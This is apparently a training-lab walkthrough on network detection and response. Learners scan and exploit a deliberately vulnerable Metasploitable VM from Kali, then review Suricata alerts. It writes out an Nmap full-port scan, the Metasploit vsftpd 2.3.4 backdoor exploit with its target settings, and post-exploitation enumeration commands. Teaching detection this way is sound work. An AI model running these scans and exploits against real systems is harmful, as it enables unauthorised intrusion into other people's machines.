## Understanding NDR

**What is NDR?**

NDR refers to technologies and processes that monitor network traffic to detect, analyze, and respond to threats in real-time. It emphasizes not just detection but also response strategies.

**Importance of NDR:**

In today’s threat landscape, traditional perimeter defenses are insufficient. NDR solutions help organizations identify threats that bypass these defenses and respond swiftly to minimize damage.

**How NDR Tools Work**
- **Traffic Analysis:** Tools like Suricata analyze network packets in real-time, looking for signatures of known attacks, anomalies, or unusual behavior.
- **Alert Generation:** When suspicious activity is detected, alerts are generated, providing security teams with actionable insights.
- **Incident Response:** The response can range from automated actions (like blocking an IP) to manual interventions based on alert severity.

## Attack Overview
In this lab, participants will simulate an attack on the Metasploitable VM using the following steps:

- **Reconnaissance:** Identify open ports and services running on the Metasploitable VM using network scanning tools like Nmap.
- **Exploitation:** Use Metasploit to exploit known vulnerabilities in the Metasploitable VM, specifically targeting the vsFTPd service, which contains a backdoor vulnerability.
- **Post-Exploitation:** Execute commands to escalate privileges and exfiltrate data, simulating actions an attacker might take after gaining access.
- **Detection:** Monitor network traffic for suspicious activities related to the reconnaissance and exploitation phases, allowing participants to observe how an NDR solution like Suricata detects and logs these activities.
Suspicious Network Activities Include:

**Suspicious Network Activities Include:**

- ICMP echo requests (ping) generating traffic.
- TCP SYN packets during port scanning.
- Exploitation attempts that trigger alerts in the NDR solution.

## Lab Activities

**Update GPG Keys and Package Lists**

Update GPG Keys: Run the following command in the Kali terminal:

```
sudo apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com
```
GPG (GNU Privacy Guard) keys are used to digitally sign packages in a Linux distribution's package repository, updating GPG keys is a security best practice that helps ensure the authenticity and integrity of the software packages you download and install on your system.

Next, run the below command to update the list of available packages.

```
sudo apt-get update
```
This command refreshes the list of available packages on Kali Linux, making sure you can install the latest versions.

**Activity 1: Generating Traffic and Reconnaissance**

Objective: Generate network traffic and identify open ports and services on the Metasploitable VM.

1. In the labvm provided, click on **Hyper-V Manager** and select **Metasploitable** under the Virtual machines and click on **Start** to start the virtual machine.

2. Once the  Metasploitable OS is on or in Running state, wait for the machine to boot up and click on **Connect**.
   
3. You will be prompted to login to the guest OS. Use the below credentials and login to the guest OS.

   > **Note:** The below commands need to be entered manually in terminal.

   * **Username:** <inject key="Metasploitable VM Username" />
   * **Password:** <inject key="Metasploitable VM Password" />

4. After you are logged in, run the below command to get the IP address of the Metasploitable Virtual machine. Note down the IP address as you will be using it in the next step.

   > **Note:** The below command need to be entered manually in terminal.
   
   ifconfig

   This command displays the network configuration, including the IP address, which you will use in Kali Linux for reconnaissance

6. Now, navigate back to Kali-Linux VM and run the below command in the terminal window to install and run an Open-Source NDR Tool:
   Install Suricata:
   ```
   sudo apt install suricata
   ```
    This command installs Suricata, the open-source NDR tool that will be used to monitor traffic.
   
7. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
   ```
   ping <Metasploitable_IP>
   ```
  This sends ICMP echo requests to the Metasploitable VM, generating traffic that will be logged by Suricata.

8. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
   ```
   nmap -sS -sV -p- <Metasploitable_IP>
   ```
   This command scans the Metasploitable VM for open ports and services, helping you gather reconnaissance data.
   
9. Analyze the output: Look for open ports, the state of each port (open/closed/filtered), and the service/version information.

    Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.

**Activity 2: Exploitation**

Objective: Exploit vulnerabilities in Metasploitable to simulate an attack,observing how NDR detects these actions.

1.  Open a terminal in Kali Linux and launch Metasploit by running the below command
    ``` 
    msfconsole
    ```
   This command starts the Metasploit Framework, a powerful tool for exploiting vulnerabilities.
   
2. Search for available exploits for Metasploitable services (e.g., vsftpd):
   ```
   search vsftpd
   ```
   vsFTPd (Very Secure FTP Daemon) is a popular FTP server for Unix-like systems.This command searches for available exploits targeting the vsFTPd service, which has known vulnerabilities.

3. Select and configure the exploit:
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST <Metasploitable_IP>
    exploit
    ```
    This configures the selected exploit against the Metasploitable VM and attempts to execute it.
   
5. Verify Access: After successfully exploiting, interact with the session created to confirm access to Metasploitable.

   Note: This step verifies that the exploit worked and that you have control over the Metasploitable VM

**Activity 3: Post-Exploitation Actions**

Objective: Simulate actions an attacker might take after gaining access.

1. Privilege Escalation: Attempt to escalate privileges using techniques. Run the command in Kali Linux
   ```
   sudo -l
   ```
   This command lists the commands that can be run with elevated privileges, providing insight into potential privilege escalation paths.
   
3. Data Gathering: Run commands to gather system information on Metasploitable VM
   ```
   uname -a
   whoami
   ```
   These commands help identify the operating system and current user, crucial for planning further exploitation.
   
5. Network Information: Check network configuration:
   ```
   ifconfig
   ```
   This command provides details about the network interfaces on the Metasploitable VM, which may be useful for lateral movement.
   
7. Open Ports and Services: Check for open ports and services:
   ```
   netstat -tuln
   ```
   This command displays active connections and listening ports, helping you identify potential targets for further exploitation.
   
**Activity 4: Monitoring and Analysis**

Objective: Simulate monitoring and analyze alerts related to the activities performed.

1. Start Suricata: Check the status of Suricata to ensure it's running:
   ```
   sudo systemctl status suricata
   ```
   This command verifies that Suricata is running and monitoring network traffic.

2. If it's not running, start Suricata:
   ```
   sudo systemctl start suricata
    ```
    This command starts Suricata to begin monitoring for suspicious activities.

3. Configure Suricata to monitor the appropriate network interface.
   ```
   sudo suricata -c /etc/suricata/suricata.yaml -i eth0
   ```
   This command configures Suricata to monitor the specified network interface for traffic.

4. Review Logs: Check logs for alerts generated during the reconnaissance, exploitation, and post-exploitation activities:
   ```
   cat /var/log/suricata/fast.log
   ```
   This command displays the fast log where Suricata records detected anomalies, allowing you to analyze how it responds to the simulated attack.

5. Review eve.json for Detailed Logs:
   You can also examine the eve.json file for comprehensive event logs:
   ```
   cat /var/log/suricata/eve.json
   ```
   This file contains detailed information about alerts, HTTP requests, and other events in JSON format, which is useful for deeper analysis.

6. Check suricata.log:
   Finally, check the general Suricata logs for operational details:
   ```
   cat /var/log/suricata/suricata.log
   ```
   This log captures information about Suricata's startup, errors, and warnings, which can help troubleshoot any issues.

## Discussion and Analysis
- Review the types of attacks conducted and how they might be detected by an NDR solution.
- Analyze the alerts generated by Suricata or expected alerts from typical NDR systems.
- Discuss how the knowledge gained can be applied to enhance network security measures.

## Summary
In summary, the lab simulates a series of common attack phases (reconnaissance, exploitation, and post-exploitation) using tools and techniques that are widely used in real-world cyber attacks. The suspicious activities generated during this process—such as port scanning, exploit attempts, and data exfiltration—are what NDR solutions are designed to detect and respond to. Participants can observe how these actions manifest in logs and alerts from the NDR tool, enhancing their understanding of network security monitoring.
